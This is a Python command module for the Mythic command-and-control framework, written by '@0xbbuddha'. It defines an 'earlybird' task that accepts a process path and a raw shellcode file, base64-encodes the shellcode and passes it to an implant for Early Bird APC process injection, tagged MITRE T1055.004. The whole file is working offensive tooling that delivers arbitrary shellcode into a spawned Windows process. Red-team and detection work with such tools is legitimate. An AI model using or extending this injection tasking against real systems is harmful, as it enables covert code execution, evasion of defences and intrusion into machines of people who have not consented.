import base64

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class EarlybirdArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="process",
                type=ParameterType.String,
                description="Full path of the process to spawn (e.g. C:\\Windows\\System32\\notepad.exe)",
                default_value="C:\\Windows\\System32\\notepad.exe",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=0, required=True)],
            ),
            CommandParameter(
                name="shellcode",
                type=ParameterType.File,
                description="Raw shellcode file to inject (position-independent, x64)",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default", ui_position=1, required=True)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)


class EarlybirdCommand(CommandBase):
    cmd = "earlybird"
    needs_admin = False
    help_cmd = "earlybird -process C:\\Windows\\System32\\notepad.exe -shellcode <file>"
    description = (
        "Early Bird APC injection: spawns a process suspended, writes shellcode via "
        "VirtualAllocEx + WriteProcessMemory, queues an APC on the main thread, "
        "then resumes — shellcode executes before the process entry point."
    )
    version = 1
    author = "@0xbbuddha"
    argument_class = EarlybirdArguments
    attackmapping = ["T1055.004"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        process = taskData.args.get_arg("process")
        file_id = taskData.args.get_arg("shellcode")

        # Retrieve shellcode file content from Mythic and embed as base64
        # so the agent receives it directly without a separate file transfer.
        try:
            file_resp = await SendMythicRPCFileGetContent(
                MythicRPCFileGetContentMessage(AgentFileId=file_id)
            )
            if not file_resp.Success:
                response.Success = False
                response.Error = f"Failed to retrieve shellcode file: {file_resp.Error}"
                return response

            shellcode_b64 = base64.b64encode(file_resp.Content).decode("utf-8")
            taskData.args.add_arg(
                "shellcode",
                shellcode_b64,
                parameter_group_info=[ParameterGroupInfo(group_name="Default")],
            )
        except Exception as e:
            response.Success = False
            response.Error = f"Error fetching shellcode: {str(e)}"
            return response

        response.DisplayParams = f"{process} ({len(file_resp.Content)} bytes)"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
